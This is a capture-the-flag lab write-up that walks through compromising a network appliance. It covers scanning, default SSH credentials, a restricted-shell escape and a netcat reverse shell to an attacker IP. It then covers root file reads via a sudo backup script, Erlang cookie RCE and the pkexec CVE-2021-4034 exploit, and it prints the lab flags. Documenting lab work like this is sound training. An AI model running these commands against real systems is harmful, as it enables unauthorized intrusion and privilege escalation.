When we try to start the `VPN`, it asks us to enter the username (`elonmusk`) and the password (`otp`)
```
sudo openvpn hackfail.ovpn
Enter Auth Username: elonmusk  
Enter Auth Password: 75703172

ifconfig tun1
tun1: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 172.22.0.10  netmask 255.255.255.255  destination 172.22.0.5
        inet6 fe80::f78:7adc:30f:bdf2  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)  
        RX packets 1  bytes 84 (84.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 7  bytes 444 (444.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Then the `ip` address change into `172.22.0.10`

Let's do `nmap` like before
```
fping -g -r 1 172.22.0.0/16  
172.22.0.10 is alive
172.22.0.1 is alive
172.22.5.176 is alive
172.22.43.1 is alive
172.22.43.142 is alive

nmap 172.22.5.176
Nmap scan report for 172.22.5.176
PORT    STATE SERVICE
22/tcp  open  ssh
179/tcp open  bgp
646/tcp open  ldp

netcat 172.22.5.176 179
����������������}bZ������������������  
```

172.22.5.176 looks interesting, but, while it has ssh, the credentials don’t work and the other ports don’t show us anything really clear.

Continue to `nmap` 172.22.43.1
```
nmap 172.22.43.1
Nmap scan report for 172.22.43.1  
PORT     STATE SERVICE
3128/tcp open  squid-http
```

When we open it in a browser we can see something interesting, namely the team name `core01`, the domain maybe `core01.local`
![](images/Pasted%20image%2020250801153831.png)

We can use `spose` to scan the ports of the domain, and through squid proxy we can find that ssh port 22 is open on the computer.
```
python3 spose.py --proxy http://172.22.43.1:3128 --target core01.local  
Using proxy address http://172.22.43.1:3128
core01.local 22 seems OPEN
```

Remember we get the `readme.txt` file
```
monitoring@watcher:~$ cat readme.txt 
Hey bob,
I already told you to change your credentials for the network_admin, it is too obvious!.  
Once you have done that, please backup the files I told you on our network appliance.
```

Using `network_admin` as the username and password for ssh, we can access the machine
```
ssh network_admin@core01.local
network_admin@core01.local's password: network_admin

            _       _       _                           _             
   /\      | |     (_)     (_)     _               _   (_)            
  /  \   _ | |____  _ ____  _  ___| |_   ____ ____| |_  _  ___  ____  
 / /\ \ / || |    \| |  _ \| |/___)  _) / ___) _  |  _)| |/ _ \|  _ \ 
| |__| ( (_| | | | | | | | | |___ | |__| |  ( ( | | |__| | |_| | | | |
|______|\____|_|_|_|_|_| |_|_(___/ \___)_|   \_||_|\___)_|\___/|_| |_|
                                                                      
                             _                                        
                            | |                                       
  ____ ___  ____   ___  ___ | | ____                                  
 / ___) _ \|  _ \ /___)/ _ \| |/ _  )                                 
( (__| |_| | | | |___ | |_| | ( (/ /                                  
 \____)___/|_| |_(___/ \___/|_|\____)                                 
                                         
[+] Script to perform administration tasks.
[+] This is a very sensitive network applicance, be carefull with your actions.  

[+] List of available commands:
        - id                    return the uid
        - flag                  welcome banner
        - listSocketsListen     list listenting TCP sockets
        - listSockets           list sockets
        - backup                make a configuration backup
        - backupRestore         resore a configuration backup
        - listCmd               display the list of the valid commands
        - changeLog             display the change log
        - showIp                display IP address
        - setIp                 change IP address
        - showDNS               display DNS server address
        - setDNS                set DNS server address
        - showRoutes            display routes
        - setRoutes             set routes
        - showUsers             display users
        - exit                  exit

[admin]> flag
SYNACKTIV{Th3r3_1s_n0_pl4ce_l1ke_l0c@lh0st}  
[admin]>

```
Then we can get another flag here

Continue to check the function `changelog`
```
[admin]> changeLog

# Change Log

## [6.2.0]

### Fixed

Use less instead of vim to prevent shell escape.

### Added

................................................  
```

If we try to execute the id command using `!,` it will simply exit without executing the command.
```
!id
[admin]>
```
But if we try 
```
|$id
uid=1001(network_admin) gid=1001(network_admin) groups=1001(network_admin)  
[admin]>
```
It does execute it, and although it exits, it shows us the output

We can run the reverse shell here
```
|$netcat -e /bin/bash 10.10.14.10 443  
```

Then we can get shell as `network_admin`
```
nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.37.13
python3 -c "import pty; pty.spawn('/bin/bash')"
network_admin@core01:~$ id
uid=1001(network_admin) gid=1001(network_admin) groups=1001(network_admin)  
```

We can get another shell here.
```
network_admin@core01:~$ hostname -I
10.13.37.13 172.22.1.1 172.22.43.1 dead:beef::250:56ff:feb9:f81b
network_admin@core01:~$ cat flag.txt
SYNACKTIV{L3ss_is_Th3_n3w_Sh3LL}
network_admin@core01:~$
```

# Privilege escalation
I will firstly check `sudo -l`
```
network_admin@core01:~$ sudo -l
Matching Defaults entries for network_admin on core01:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/bin\:/sbin\:/bin  

User network_admin may run the following commands on core01:
    (root) NOPASSWD: /usr/bin/admin_backup
network_admin@core01:~$ sudo /usr/bin/admin_backup
Usage:
  admin_backup.py [options] backup [--conf-file=<file>]
  admin_backup.py [options] restore
```

We can read its source code
```
BACKUP_CONF = "/root/backup.conf"
BACKUP = "/root/backup.zip"

def backup(confFile):
    print("[+] Reading configuration file.")
    f = open(confFile, 'r')
    print("[+] Making backup.")
    with ZipFile(BACKUP, 'w') as zipBackup:
        for line in f.readlines():
            line = line.strip()
            content = open(line, 'r').read()
            zipBackup.writestr(line, content)  
    zipBackup.close()
    f.close()

def backupRestore():
    # not implemented
    print("[+] Not implemented.")
```

Normal operation is to pass a list of files as conf
```
network_admin@core01:~$ sudo admin_backup backup --conf-file=/root/backup.conf  
[+] Reading configuration file.
[+] Making backup.
```

But This program has a vulnerability: it reads a file and attempts to save each line to a new file. If we set the "error output file path" to point to another file, the program could read the first line of that file.

More importantly, if the program is run with `sudo` (superuser) privileges, the file read and save operations will also be performed with root privileges. This allows us to read sensitive files as root that we shouldn't have access to.

For example
```
network_admin@core01:~$ sudo admin_backup backup --conf-file=/etc/passwd
[+] Reading configuration file.
[+] Making backup.
Traceback (most recent call last):
  File "/usr/bin/admin_backup", line 45, in <module>
    backup(confFile)
  File "/usr/bin/admin_backup", line 28, in backup
    content = open(line, 'r').read()
FileNotFoundError: [Errno 2] No such file or directory: 'root:x:0:0:root:/root:/bin/bash'  
```

But we still need others to help us get shell as root.

Continue to check the port services 
```
network_admin@core01:~$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN     
tcp        0      0 172.22.43.1:3128        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:45183           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:37769           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:39851           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:37453         127.0.0.1:4369          ESTABLISHED  
tcp        0      0 10.13.37.13:45624       10.10.14.4:9001         ESTABLISHED  
tcp        0      0 10.13.37.13:46926       10.10.16.8:9008         ESTABLISHED  
tcp        0      0 127.0.0.1:41703         127.0.0.1:4369          ESTABLISHED  
tcp        0      0 127.0.0.1:33626         127.0.0.1:22            ESTABLISHED  
tcp        0      0 127.0.0.1:22            127.0.0.1:33626         ESTABLISHED  
tcp        0      0 10.13.37.13:43014       10.10.14.4:4444         ESTABLISHED  
tcp        0      0 10.13.37.13:52936       10.10.16.8:9006         ESTABLISHED  
tcp        0      0 172.22.43.1:3128        172.22.43.142:37142     ESTABLISHED  
tcp        0      0 127.0.0.1:45881         127.0.0.1:4369          ESTABLISHED  
tcp6       0      0 :::4369                 :::*                    LISTEN     
tcp6       0      0 127.0.0.1:4369          127.0.0.1:37453         ESTABLISHED  
tcp6       0      0 127.0.0.1:4369          127.0.0.1:45881         ESTABLISHED  
tcp6       0      0 127.0.0.1:4369          127.0.0.1:41703         ESTABLISHED  
```

Port `4369` seems like our target, it seems like the service `erlang`, there is a blog show us how to exploit it to get shell
```
https://medium.com/@_sadshade/couchdb-erlang-and-cookies-rce-on-default-settings-b1e9173a4bcd
```

Firstly, we need to check the cookie of root
```
network_admin@core01:~$ sudo admin_backup backup --conf-file=/root/.erlang.cookie  
[+] Reading configuration file.
[+] Making backup.
Traceback (most recent call last):
  File "/usr/bin/admin_backup", line 45, in <module>
    backup(confFile)
  File "/usr/bin/admin_backup", line 28, in backup
    content = open(line, 'r').read()
FileNotFoundError: [Errno 2] No such file or directory: 'MLTSUUNJKJYAXRTQYKLA'
```

Change the exploited script
```
COOKIE = "MLTSUUNJKJYAXRTQYKLA" # Default Erlang cookie for CouchDB  
```

Then run the exploited script and we can get the shell as root
```
network_admin@core01:~$ python3 erlang-otp-rce.py 
Remote Command Execution via Erlang Distribution Protocol.  

Enter target host:
> 127.0.0.1

More than one node found, choose which one to use:
 1) name network_node3 at port 37769
 2) name network_node1 at port 45183
 3) name network_node2 at port 39851

> 1
Authentication successful
Enter command:

> id
uid=0(root) gid=0(root) groups=0(root)

> hostname -I
10.13.37.13 172.22.1.1 172.22.43.1 dead:beef::250:56ff:feb9:f81b  

> cat /root/flag.txt
SYNACKTIV{E@t_d4t_C00kie}
```

We can find the last flag from `/`, but even root still could not check it
```
> ls -l /flag.txt
-rw-r----- 1 root root 33 Mar  5  2021 /flag.txt  

> cat /flag.txt
cat: /flag.txt: Permission denied

```

That means the current shell would not allow us to check it.

Let's check search for `suid` binaries
```
network_admin@core01:~$ find / -perm -u+s 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/ntfs-3g
/usr/bin/bwrap
/usr/bin/su
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/mount
network_admin@core01:~$ ls -l /usr/bin/pkexec
-rwsr-xr-x 1 root root 23288 Jan 15  2019 /usr/bin/pkexec  
```

Very typical exploit, after run the exploited script, you can get shell as root.
```
network_admin@core01:~$ python3 CVE-2021-4034.py 
[+] Creating shared library for exploit code.
[+] Calling execve()
# whoami
root
# hostname -I
10.13.37.13 172.22.1.1 172.22.43.1 dead:beef::250:56ff:feb9:f81b  
# cat /flag.txt
SYNACKTIV{S3Linux_1s_w@y_bett3r}
#
```

# Description

Very long and not too difficult `CTF` category machine.